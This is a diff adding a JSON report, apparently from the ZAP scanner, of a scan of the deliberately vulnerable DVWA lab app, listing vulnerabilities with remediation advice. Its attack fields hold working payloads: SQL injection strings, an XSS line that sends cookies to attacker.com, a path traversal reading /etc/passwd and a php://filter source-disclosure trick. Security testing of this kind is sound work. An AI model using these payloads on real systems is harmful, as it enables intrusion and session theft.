@@ -1,0 +1,301 @@
+{
+  "@version": "2.11.1",
+  "@generated": "2025-12-06T16:25:00",
+  "site": [
+    {
+      "@name": "http://dvwa.local",
+      "@host": "dvwa.local",
+      "@port": "80",
+      "@ssl": "false",
+      "alerts": [
+        {
+          "pluginid": "40018",
+          "alert": "SQL Injection",
+          "name": "SQL Injection",
+          "riskcode": "3",
+          "confidence": "Medium",
+          "risk": "High",
+          "riskdesc": "High (Medium)",
+          "desc": "SQL injection may be possible. The following SQL injection was attempted: [1' OR '1'='1]; the server responded with a different response than when a normal value was used.",
+          "instances": [
+            {
+              "url": "http://dvwa.local/vulnerabilities/sqli/",
+              "method": "GET",
+              "param": "id",
+              "attack": "1' OR '1'='1",
+              "evidence": "You have an error in your SQL syntax"
+            },
+            {
+              "url": "http://dvwa.local/vulnerabilities/sqli/",
+              "method": "POST",
+              "param": "id",
+              "attack": "1' UNION SELECT null, version()-- ",
+              "evidence": "MySQL version: 5.7.33"
+            }
+          ],
+          "count": "2",
+          "solution": "Use parameterized queries or prepared statements. Implement input validation.",
+          "reference": "https://owasp.org/www-community/attacks/SQL_Injection\nhttps://cwe.mitre.org/data/definitions/89.html",
+          "cweid": "89",
+          "wascid": "19",
+          "sourceid": "1"
+        },
+        {
+          "pluginid": "40012",
+          "alert": "Cross Site Scripting",
+          "name": "Cross Site Scripting",
+          "riskcode": "3",
+          "confidence": "High",
+          "risk": "High",
+          "riskdesc": "High (Medium)",
+          "desc": "Cross-site Scripting (XSS) attacks are a type of injection problem, in which malicious scripts are injected into the otherwise benign and trusted web sites.",
+          "instances": [
+            {
+              "url": "http://dvwa.local/vulnerabilities/xss_r/",
+              "method": "GET",
+              "param": "name",
+              "attack": "<script>alert('XSS')</script>",
+              "evidence": "<script>alert('XSS')</script>"
+            },
+            {
+              "url": "http://dvwa.local/vulnerabilities/xss_s/",
+              "method": "POST",
+              "param": "mtxMessage",
+              "attack": "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>",
+              "evidence": "<script>document.location"
+            }
+          ],
+          "count": "2",
+          "solution": "Phase: Architecture and Design. Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. Examples of libraries and frameworks that make it easier to generate properly encoded output include Microsoft's Anti-XSS library, the OWASP ESAPI Encoding module, and Apache Wicket.",
+          "reference": "https://owasp.org/www-community/attacks/xss/\nhttps://cwe.mitre.org/data/definitions/79.html",
+          "cweid": "79",
+          "wascid": "8",
+          "sourceid": "3"
+        },
+        {
+          "pluginid": "10202",
+          "alert": "Anti-CSRF Tokens Check",
+          "name": "Anti-CSRF Tokens Check",
+          "riskcode": "2",
+          "confidence": "Medium",
+          "risk": "Medium",
+          "riskdesc": "Medium (Medium)",
+          "desc": "No Anti-CSRF tokens were found in a HTML submission form. A cross-site request forgery is an attack that involves forcing a victim to send an HTTP request to a target destination without their knowledge or intent in order to perform an action as the victim.",
+          "instances": [
+            {
+              "url": "http://dvwa.local/vulnerabilities/csrf/",
+              "method": "GET",
+              "param": "password_new",
+              "attack": "",
+              "evidence": "<form action=\"#\" method=\"GET\">"
+            }
+          ],
+          "count": "1",
+          "solution": "Phase: Architecture and Design. Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. For example, use anti-CSRF packages such as the OWASP CSRFGuard.",
+          "reference": "https://owasp.org/www-community/attacks/csrf\nhttps://cwe.mitre.org/data/definitions/352.html",
+          "cweid": "352",
+          "wascid": "9",
+          "sourceid": "4"
+        },
+        {
+          "pluginid": "6",
+          "alert": "Path Traversal",
+          "name": "Path Traversal",
+          "riskcode": "3",
+          "confidence": "High",
+          "risk": "High",
+          "riskdesc": "High (Medium)",
+          "desc": "The Path Traversal attack technique allows an attacker access to files, directories, and commands that potentially reside outside the web document root directory.",
+          "instances": [
+            {
+              "url": "http://dvwa.local/vulnerabilities/fi/",
+              "method": "GET",
+              "param": "page",
+              "attack": "../../../../../../../etc/passwd",
+              "evidence": "root:x:0:0:root:/root:/bin/bash"
+            }
+          ],
+          "count": "1",
+          "solution": "Assume all input is malicious. Use an \"accept known good\" input validation strategy.",
+          "reference": "https://owasp.org/www-www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include\nhttps://cwe.mitre.org/data/definitions/22.html",
+          "cweid": "22",
+          "wascid": "33",
+          "sourceid": "5"
+        },
+        {
+          "pluginid": "90026",
+          "alert": "Source Code Disclosure",
+          "name": "Source Code Disclosure",
+          "riskcode": "2",
+          "confidence": "Medium",
+          "risk": "Medium",
+          "riskdesc": "Medium (Medium)",
+          "desc": "Application Source Code was disclosed by the web server - PHP",
+          "instances": [
+            {
+              "url": "http://dvwa.local/vulnerabilities/fi/",
+              "method": "GET",
+              "param": "page",
+              "attack": "php://filter/convert.base64-encode/resource=index",
+              "evidence": "PD9waHAKCi8vIERWV0EgaW5kZXggcGFnZQo="
+            }
+          ],
+          "count": "1",
+          "solution": "Ensure that application Source Code is not available with alternative extensions, and ensure that source code is not present within other files or data deployed to the web server, or served by the web server.",
+          "reference": "http://blogs.wsj.com/cio/2013/10/08/adobe-source-code-leak-is-bad-news-for-u-s-government/",
+          "cweid": "540",
+          "wascid": "13",
+          "sourceid": "6"
+        },
+        {
+          "pluginid": "90033",
+          "alert": "Loosely Scoped Cookie",
+          "name": "Loosely Scoped Cookie",
+          "riskcode": "1",
+          "confidence": "Low",
+          "risk": "Low",
+          "riskdesc": "Low (Low)",
+          "desc": "Cookies can be scoped by domain or path. This check is only concerned with domain scope. The domain scope applied to a cookie determines which domains can access it.",
+          "instances": [
+            {
+              "url": "http://dvwa.local/login.php",
+              "method": "GET",
+              "param": "PHPSESSID",
+              "attack": "",
+              "evidence": "Set-Cookie: PHPSESSID=abc123; path=/"
+            }
+          ],
+          "count": "1",
+          "solution": "Always scope cookies to a FQDN (Fully Qualified Domain Name).",
+          "reference": "https://tools.ietf.org/html/rfc6265#section-4.1\nhttps://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes.html",
+          "cweid": "565",
+          "wascid": "15",
+          "sourceid": "7"
+        },
+        {
+          "pluginid": "90019",
+          "alert": "Server Leaks Version Information via Server HTTP Response Header Field",
+          "name": "Server Leaks Information via \"X-Powered-By\" HTTP Response Header Field(s)",
+          "riskcode": "1",
+          "confidence": "2",
+          "riskdesc": "Low (Medium)",
+          "desc": "The web/application server is leaking version information via one or more \"X-Powered-By\" HTTP response headers.",
+          "instances": [
+            {
+              "url": "http://dvwa.local/",
+              "method": "GET",
+              "param": "",
+              "attack": "",
+              "evidence": "X-Powered-By: PHP/7.4.3"
+            }
+          ],
+          "count": "1",
+          "solution": "Ensure that your web server, application server, load balancer, etc. is configured to suppress \"X-Powered-By\" headers.",
+          "reference": "http://blogs.msdn.com/b/varunm/archive/2013/04/23/remove-unwanted-http-response-headers.aspx\nhttp://www.troyhunt.com/2012/02/shhh-dont-let-your-response-headers.html",
+          "cweid": "200",
+          "wascid": "13",
+          "sourceid": "8"
+        },
+        {
+          "pluginid": "10055",
+          "alert": "CSP Header Not Set",
+          "name": "CSP: Wildcard Directive",
+          "riskcode": "2",
+          "confidence": "Medium",
+          "risk": "Medium",
+          "riskdesc": "Medium (Medium)",
+          "desc": "Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross Site Scripting (XSS) and data injection attacks.",
+          "instances": [
+            {
+              "url": "http://dvwa.local/",
+              "method": "GET",
+              "param": "",
+              "attack": "",
+              "evidence": ""
+            }
+          ],
+          "count": "1",
+          "solution": "Ensure that your web server, application server, load balancer, etc. is configured to set the Content-Security-Policy header, to achieve sufficient mitigation against XSS vulnerabilities.",
+          "reference": "https://www.w3.org/TR/CSP/\nhttps://caniuse.com/#feat=contentsecuritypolicy\nhttp://www.html5rocks.com/en/tutorials/security/content-security-policy/\nhttps://www.owasp.org/index.php/Content_Security_Policy",
+          "cweid": "693",
+          "wascid": "15",
+          "sourceid": "9"
+        },
+        {
+          "pluginid": "40014",
+          "alert": "Cross-Domain Misconfiguration",
+          "name": "Cross-Domain Misconfiguration",
+          "riskcode": "2",
+          "confidence": "Medium",
+          "risk": "Medium",
+          "riskdesc": "Medium (Medium)",
+          "desc": "Web browser data loading may be possible, due to a Cross Origin Resource Sharing (CORS) misconfiguration on the web server",
+          "instances": [
+            {
+              "url": "http://dvwa.local/vulnerabilities/xss_r/",
+              "method": "GET",
+              "param": "",
+              "attack": "",
+              "evidence": "Access-Control-Allow-Origin: *"
+            }
+          ],
+          "count": "1",
+          "solution": "Ensure that sensitive data is not available in an unauthenticated manner (using IP address white-listing, for instance). Configure the \"Access-Control-Allow-Origin\" HTTP header to a more restrictive set of domains, or remove all CORS headers entirely.",
+          "reference": "http://www.hpenterprisesecurity.com/vulncat/en/vulncat/vb/html5_overly_permissive_cors_policy.html",
+          "cweid": "264",
+          "wascid": "14",
+          "sourceid": "10"
+        },
+        {
+          "pluginid": "10021",
+          "alert": "X-Content-Type-Options Header Missing",
+          "name": "X-Content-Type-Options Header Missing",
+          "riskcode": "1",
+          "confidence": "2",
+          "riskdesc": "Low (Medium)",
+          "desc": "The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body.",
+          "instances": [
+            {
+              "url": "http://dvwa.local/",
+              "method": "GET",
+              "param": "X-Content-Type-Options",
+              "attack": "",
+              "evidence": ""
+            }
+          ],
+          "count": "1",
+          "solution": "Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.",
+          "reference": "http://msdn.microsoft.com/en-us/library/ie/gg622941%28v=vs.85%29.aspx\nhttps://owasp.org/www-community/Security_Headers",
+          "cweid": "16",
+          "wascid": "15",
+          "sourceid": "11"
+        },
+        {
+          "pluginid": "10096",
+          "alert": "Timestamp Disclosure - Unix",
+          "name": "Timestamp Disclosure",
+          "riskcode": "1",
+          "confidence": "Low",
+          "risk": "Low",
+          "riskdesc": "Low (Low)",
+          "desc": "A timestamp was disclosed by the application/web server - Unix",
+          "instances": [
+            {
+              "url": "http://dvwa.local/vulnerabilities/sqli/",
+              "method": "GET",
+              "param": "",
+              "attack": "",
+              "evidence": "1638806400"
+            }
+          ],
+          "count": "1",
+          "solution": "Manually confirm that the timestamp data is not sensitive, and that the data cannot be aggregated to disclose exploitable patterns.",
+          "reference": "http://projects.webappsec.org/w/page/13246936/Information%20Leakage",
+          "cweid": "200",
+          "wascid": "13",
+          "sourceid": "12"
+        }
+      ]
+    }
+  ]
+}
